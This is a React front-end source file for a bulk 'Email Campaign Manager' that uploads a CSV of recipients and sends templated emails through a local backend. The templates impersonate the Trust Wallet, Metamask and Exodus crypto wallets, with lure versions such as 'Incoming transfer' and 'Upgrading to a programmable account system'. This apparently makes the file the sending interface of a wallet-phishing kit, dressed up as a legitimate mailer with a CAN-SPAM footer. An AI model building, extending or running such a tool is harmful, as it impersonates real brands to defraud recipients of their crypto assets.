import React, { useState } from "react";
import {
  Upload,
  Mail,
  FileText,
  Send,
  CheckCircle,
  AlertCircle,
  Loader,
  Layout,
} from "lucide-react";

export default function App() {
  const [step, setStep] = useState(1);
  const [csvFile, setCsvFile] = useState(null);
  const [selectedTemplate, setSelectedTemplate] = useState("");
  const [selectedVersion, setSelectedVersion] = useState("");
  const [sending, setSending] = useState(false);
  const [results, setResults] = useState(null);
  const [error, setError] = useState("");
  const [recipientCount, setRecipientCount] = useState(0);

  const API_URL = "http://localhost:3000/api";

  const templates = [
    {
      id: "trust",
      name: "Trust Wallet",
      description: "Trust Wallet Multiple Versions",
      icon: "👋",
    },
    {
      id: "metamask",
      name: "Metamask",
      description: "Metamask Multiple Versions",
      icon: "📰",
    },
    {
      id: "exodus",
      name: "Exodus",
      description: "Exodus Mutiple Versions",
      icon: "🎁",
    },
    // {
    //   id: "notification",
    //   name: "System Notification",
    //   description: "Send important account updates",
    //   icon: "🔔",
    // },
  ];

  const templateVersions = {
    trust: [
      {
        id: "v1",
        name: "Version 1",
        description: "Incoming transfer",
      },
      {
        id: "v2",
        name: "Version 2",
        description: "Decentralized identity regulations",
      },
    ],
    metamask: [
      {
        id: "v1",
        name: "Version 1",
        description: "Incoming transfer",
      },
      {
        id: "v2",
        name: "Version 2",
        description: "Upgrading to a programmable account system",
      },
    ],
    exodus: [
      {
        id: "v1",
        name: "Version 1",
        description: "Incoming transfer",
      },
    ],
  };

  const handleFileUpload = async (file) => {
    if (!file || !file.name.endsWith(".csv")) {
      setError("Please upload a valid CSV file");
      return;
    }

    setCsvFile(file);
    setError("");

    // Preview CSV
    try {
      const formData = new FormData();
      formData.append("file", file);

      const response = await fetch(`${API_URL}/upload-csv`, {
        method: "POST",
        body: formData,
      });

      const data = await response.json();

      if (data.success) {
        setRecipientCount(data.count);
        console.log("CSV Preview:", data.preview);
      }
    } catch (err) {
      console.error("CSV preview error:", err);
    }
  };

  const handleDrop = (e) => {
    e.preventDefault();
    const file = e.dataTransfer.files[0];
    handleFileUpload(file);
  };

  const handleDragOver = (e) => {
    e.preventDefault();
  };

  const handleSendEmails = async () => {
    setSending(true);
    setError("");

    try {
      const formData = new FormData();
      formData.append("file", csvFile);
      formData.append("template", selectedTemplate);
      formData.append("version", selectedVersion);

      const response = await fetch(`${API_URL}/send-campaign`, {
        method: "POST",
        body: formData,
      });

      const data = await response.json();

      if (data.success) {
        setResults(data.results);
      } else {
        setError(data.error || "Failed to send campaign");
      }
    } catch (err) {
      setError("Network error. Please check if the server is running.");
      console.error("Send error:", err);
    } finally {
      setSending(false);
    }
  };

  const resetForm = () => {
    setStep(1);
    setCsvFile(null);
    setSelectedTemplate("");
    setSelectedVersion("");
    setResults(null);
    setError("");
    setRecipientCount(0);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 p-8">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-indigo-600 rounded-full mb-4">
            <Mail className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-3xl font-bold text-gray-800 mb-2">
            Email Campaign Manager
          </h1>
          <p className="text-gray-600">
            Send professional emails to your subscribers
          </p>
        </div>

        {/* Progress Steps */}
        <div className="flex items-center justify-center mb-12">
          {[1, 2, 3, 4].map((s) => (
            <React.Fragment key={s}>
              <div className="flex flex-col items-center">
                <div
                  className={`w-12 h-12 rounded-full flex items-center justify-center font-semibold ${
                    step >= s
                      ? "bg-indigo-600 text-white"
                      : "bg-gray-300 text-gray-600"
                  }`}
                >
                  {s}
                </div>
                <span
                  className={`mt-2 text-sm ${
                    step >= s ? "text-indigo-600 font-medium" : "text-gray-500"
                  }`}
                >
                  {s === 1
                    ? "Upload List"
                    : s === 2
                    ? "Template"
                    : s === 3
                    ? "Version"
                    : "Send"}
                </span>
              </div>
              {s < 4 && (
                <div
                  className={`w-16 h-1 mx-2 ${
                    step > s ? "bg-indigo-600" : "bg-gray-300"
                  }`}
                />
              )}
            </React.Fragment>
          ))}
        </div>

        {/* Error Alert */}
        {error && (
          <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6 flex items-start">
            <AlertCircle className="w-5 h-5 text-red-600 mr-3 mt-0.5 flex-shrink-0" />
            <div>
              <p className="text-red-800 font-medium">Error</p>
              <p className="text-red-700 text-sm">{error}</p>
            </div>
          </div>
        )}

        {/* Main Card */}
        <div className="bg-white rounded-2xl shadow-xl p-8">
          {/* Step 1: Upload Email List */}
          {step === 1 && (
            <div>
              <div className="text-center mb-6">
                <Upload className="w-12 h-12 text-indigo-600 mx-auto mb-3" />
                <h2 className="text-2xl font-bold text-gray-800 mb-2">
                  Upload The Email List
                </h2>
                <p className="text-gray-600">
                  Please upload your email list CSV file
                </p>
              </div>

              <div
                onDrop={handleDrop}
                onDragOver={handleDragOver}
                className="border-3 border-dashed border-gray-300 rounded-xl p-12 text-center hover:border-indigo-400 transition-colors cursor-pointer"
              >
                {!csvFile ? (
                  <>
                    <div className="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4">
                      <Upload className="w-8 h-8 text-gray-400" />
                    </div>
                    <p className="text-gray-600 mb-4">
                      Drag and drop the csv file here or click
                    </p>
                    <label className="inline-block">
                      <input
                        type="file"
                        accept=".csv"
                        onChange={(e) => handleFileUpload(e.target.files[0])}
                        className="hidden"
                      />
                      <span className="px-6 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 cursor-pointer inline-block">
                        Browse Files
                      </span>
                    </label>
                  </>
                ) : (
                  <div className="flex items-center justify-center">
                    <FileText className="w-8 h-8 text-green-600 mr-3" />
                    <div className="text-left">
                      <p className="font-semibold text-gray-800">
                        {csvFile.name}
                      </p>
                      <p className="text-sm text-gray-600">
                        {(csvFile.size / 1024).toFixed(2)} KB
                        {recipientCount > 0 &&
                          ` • ${recipientCount} recipients`}
                      </p>
                    </div>
                    <button
                      onClick={() => {
                        setCsvFile(null);
                        setRecipientCount(0);
                      }}
                      className="ml-4 text-red-600 hover:text-red-700"
                    >
                      Remove
                    </button>
                  </div>
                )}
              </div>

              <div className="mt-6 bg-blue-50 border border-blue-200 rounded-lg p-4">
                <p className="text-sm text-blue-800">
                  <strong>CSV Format:</strong> Your file should include columns:{" "}
                  <code>email</code>, <code>name</code>
                </p>
                <p className="text-sm text-blue-800 mt-2">
                  Example: <code>email,name</code>
                  <br />
                  <code>john@example.com,John Doe</code>
                </p>
              </div>

              <button
                onClick={() => setStep(2)}
                disabled={!csvFile}
                className={`w-full mt-6 py-3 rounded-lg font-semibold transition-colors ${
                  csvFile
                    ? "bg-indigo-600 text-white hover:bg-indigo-700"
                    : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }`}
              >
                Continue
              </button>
            </div>
          )}

          {/* Step 2: Choose Template */}
          {step === 2 && (
            <div>
              <div className="text-center mb-6">
                <Mail className="w-12 h-12 text-indigo-600 mx-auto mb-3" />
                <h2 className="text-2xl font-bold text-gray-800 mb-2">
                  Choose The Template
                </h2>
                <p className="text-gray-600">
                  Please select one from the list below
                </p>
              </div>

              <div className="space-y-3">
                {templates.map((template) => (
                  <div
                    key={template.id}
                    onClick={() => setSelectedTemplate(template.id)}
                    className={`flex items-center p-4 border-2 rounded-xl cursor-pointer transition-all ${
                      selectedTemplate === template.id
                        ? "border-indigo-600 bg-indigo-50"
                        : "border-gray-200 hover:border-indigo-300"
                    }`}
                  >
                    <div className="text-3xl mr-4">{template.icon}</div>
                    <div className="flex-1">
                      <h3 className="font-semibold text-gray-800">
                        {template.name}
                      </h3>
                      <p className="text-sm text-gray-600">
                        {template.description}
                      </p>
                    </div>
                    {selectedTemplate === template.id && (
                      <CheckCircle className="w-6 h-6 text-indigo-600" />
                    )}
                  </div>
                ))}
              </div>

              <div className="flex gap-3 mt-6">
                <button
                  onClick={() => setStep(1)}
                  className="flex-1 py-3 border-2 border-gray-300 rounded-lg font-semibold text-gray-700 hover:bg-gray-50 transition-colors"
                >
                  Back
                </button>
                <button
                  onClick={() => setStep(3)}
                  disabled={!selectedTemplate}
                  className={`flex-1 py-3 rounded-lg font-semibold transition-colors ${
                    selectedTemplate
                      ? "bg-indigo-600 text-white hover:bg-indigo-700"
                      : "bg-gray-300 text-gray-500 cursor-not-allowed"
                  }`}
                >
                  Continue
                </button>
              </div>
            </div>
          )}

          {/* Step 3: Choose Version */}
          {step === 3 && (
            <div>
              <div className="text-center mb-6">
                <Layout className="w-12 h-12 text-indigo-600 mx-auto mb-3" />
                <h2 className="text-2xl font-bold text-gray-800 mb-2">
                  Choose Email Version
                </h2>
                <p className="text-gray-600">
                  Select the version that fits your campaign
                </p>
              </div>

              <div className="space-y-3">
                {templateVersions[selectedTemplate]?.map((version) => (
                  <div
                    key={version.id}
                    onClick={() => setSelectedVersion(version.id)}
                    className={`p-4 border-2 rounded-xl cursor-pointer transition-all ${
                      selectedVersion === version.id
                        ? "border-indigo-600 bg-indigo-50"
                        : "border-gray-200 hover:border-indigo-300"
                    }`}
                  >
                    <div className="flex items-start justify-between mb-2">
                      <h3 className="font-semibold text-gray-800">
                        {version.name}
                      </h3>
                      {selectedVersion === version.id && (
                        <CheckCircle className="w-6 h-6 text-indigo-600 flex-shrink-0" />
                      )}
                    </div>
                    <p className="text-sm text-gray-600 mb-3">
                      {version.description}
                    </p>
                  </div>
                ))}
              </div>

              <div className="flex gap-3 mt-6">
                <button
                  onClick={() => setStep(2)}
                  className="flex-1 py-3 border-2 border-gray-300 rounded-lg font-semibold text-gray-700 hover:bg-gray-50 transition-colors"
                >
                  Back
                </button>
                <button
                  onClick={() => setStep(4)}
                  disabled={!selectedVersion}
                  className={`flex-1 py-3 rounded-lg font-semibold transition-colors ${
                    selectedVersion
                      ? "bg-indigo-600 text-white hover:bg-indigo-700"
                      : "bg-gray-300 text-gray-500 cursor-not-allowed"
                  }`}
                >
                  Continue
                </button>
              </div>
            </div>
          )}

          {/* Step 4: Send Emails */}
          {step === 4 && !results && (
            <div>
              <div className="text-center mb-6">
                <Send className="w-12 h-12 text-indigo-600 mx-auto mb-3" />
                <h2 className="text-2xl font-bold text-gray-800 mb-2">
                  Review & Send
                </h2>
                <p className="text-gray-600">
                  Review your campaign details before sending
                </p>
              </div>

              <div className="bg-gray-50 rounded-xl p-6 mb-6 space-y-4">
                <div className="flex justify-between items-center pb-4 border-b border-gray-200">
                  <span className="text-gray-600">Email List:</span>
                  <span className="font-semibold text-gray-800">
                    {csvFile?.name}
                  </span>
                </div>
                <div className="flex justify-between items-center pb-4 border-b border-gray-200">
                  <span className="text-gray-600">Template:</span>
                  <span className="font-semibold text-gray-800">
                    {templates.find((t) => t.id === selectedTemplate)?.name}
                  </span>
                </div>
                <div className="flex justify-between items-center pb-4 border-b border-gray-200">
                  <span className="text-gray-600">Version:</span>
                  <span className="font-semibold text-gray-800">
                    {
                      templateVersions[selectedTemplate]?.find(
                        (v) => v.id === selectedVersion
                      )?.name
                    }
                  </span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-gray-600">Estimated Recipients:</span>
                  <span className="font-semibold text-indigo-600">
                    {recipientCount > 0
                      ? `${recipientCount} emails`
                      : "Calculating..."}
                  </span>
                </div>
              </div>

              {sending ? (
                <div className="text-center py-8">
                  <Loader className="w-12 h-12 text-indigo-600 animate-spin mx-auto mb-4" />
                  <p className="text-gray-600 font-medium">
                    Sending emails... Please wait
                  </p>
                  <p className="text-sm text-gray-500 mt-2">
                    This may take a few minutes
                  </p>
                </div>
              ) : (
                <>
                  <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
                    <p className="text-sm text-yellow-800">
                      <strong>Note:</strong> Make sure your server is running on
                      port 3001
                    </p>
                  </div>
                  <div className="flex gap-3">
                    <button
                      onClick={() => setStep(3)}
                      className="flex-1 py-3 border-2 border-gray-300 rounded-lg font-semibold text-gray-700 hover:bg-gray-50 transition-colors"
                    >
                      Back
                    </button>
                    <button
                      onClick={handleSendEmails}
                      className="flex-1 py-3 bg-indigo-600 text-white rounded-lg font-semibold hover:bg-indigo-700 flex items-center justify-center gap-2 transition-colors"
                    >
                      <Send className="w-5 h-5" />
                      Start Sending
                    </button>
                  </div>
                </>
              )}
            </div>
          )}

          {/* Results */}
          {results && (
            <div className="text-center">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <CheckCircle className="w-10 h-10 text-green-600" />
              </div>
              <h2 className="text-2xl font-bold text-gray-800 mb-2">
                Campaign Completed!
              </h2>
              <p className="text-gray-600 mb-6">
                Your emails have been sent successfully
              </p>

              <div className="bg-gray-50 rounded-xl p-6 mb-6">
                <div className="grid grid-cols-3 gap-4">
                  <div className="text-center">
                    <p className="text-3xl font-bold text-gray-800">
                      {results.total}
                    </p>
                    <p className="text-sm text-gray-600 mt-1">Total</p>
                  </div>
                  <div className="text-center">
                    <p className="text-3xl font-bold text-green-600">
                      {results.sent}
                    </p>
                    <p className="text-sm text-gray-600 mt-1">Sent</p>
                  </div>
                  <div className="text-center">
                    <p className="text-3xl font-bold text-red-600">
                      {results.failed}
                    </p>
                    <p className="text-sm text-gray-600 mt-1">Failed</p>
                  </div>
                </div>

                {results.errors && results.errors.length > 0 && (
                  <div className="mt-4 pt-4 border-t border-gray-200">
                    <p className="text-sm text-gray-700 font-medium mb-2">
                      Failed Emails:
                    </p>
                    <div className="max-h-32 overflow-y-auto text-left">
                      {results.errors.slice(0, 5).map((err, idx) => (
                        <p key={idx} className="text-xs text-red-600 mb-1">
                          {err.email}: {err.error}
                        </p>
                      ))}
                      {results.errors.length > 5 && (
                        <p className="text-xs text-gray-500 mt-2">
                          ...and {results.errors.length - 5} more
                        </p>
                      )}
                    </div>
                  </div>
                )}
              </div>

              <button
                onClick={resetForm}
                className="w-full py-3 bg-indigo-600 text-white rounded-lg font-semibold hover:bg-indigo-700 transition-colors"
              >
                Send Another Campaign
              </button>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="text-center mt-8 text-sm text-gray-600">
          <p>
            All emails comply with CAN-SPAM regulations • Powered by SendGrid
          </p>
        </div>
      </div>
    </div>
  );
}
